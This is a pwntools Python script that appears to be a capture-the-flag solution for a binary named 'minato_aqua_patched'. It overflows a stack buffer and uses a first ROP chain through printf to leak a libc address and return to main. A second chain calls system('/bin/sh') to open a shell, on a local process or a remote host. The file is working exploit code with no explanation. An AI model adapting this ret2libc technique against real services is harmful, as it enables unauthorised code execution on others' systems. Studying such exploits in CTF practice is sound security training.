from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "minato_aqua_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"
libc = ELF("./libc.so.6", checksec=False)

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Input: ", content)

x, p = init()
x.debug((
    "finish\n"*4
))

v1_buff = 32
padding = 8
fill = cyclic(v1_buff+padding)
main = 0x4011DE

r = ROP(exe)
r.raw(r.find_gadget(['ret']))
r.call(exe.plt['printf'])
r.raw(r.find_gadget(['ret']))
r.call(exe.plt['printf'])
r.raw(r.find_gadget(['ret']))
r.call(main)

pay = fill
pay += flat(r)

x.send(pay)

leak_address = p.recv(6)
leak_address = bytes_to_long(leak_address[::-1])
libc.address = leak_address - 0x264040
log.info(f"{leak_address:x}")
log.info(f"{libc.address:x}")

r = ROP(libc)
r.raw(r.find_gadget(['ret']))
r.call(libc.sym['system'], [libc.search(b"/bin/sh\x00").__next__()])
pay = fill
pay += flat(r)

x.send(pay)

p.interactive()